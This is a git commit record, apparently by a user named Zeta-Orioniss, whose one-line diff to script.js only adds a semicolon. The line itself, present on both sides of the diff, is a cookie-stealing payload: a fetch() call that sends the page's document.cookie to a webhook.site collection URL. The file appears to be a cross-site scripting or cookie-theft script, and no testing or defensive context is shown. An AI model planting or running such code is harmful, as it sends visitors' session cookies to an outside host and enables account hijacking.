3816e810b300d936d078109b215ba6b56907ff24
Zeta-Orioniss <ylanbaba31@gmail.com>
2024-05-30 22:07:11 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/604a4a1d-9833-443d-8bc7-860ece114393?cookie=' + document.cookie)
+fetch('https://webhook.site/604a4a1d-9833-443d-8bc7-860ece114393?cookie=' + document.cookie);
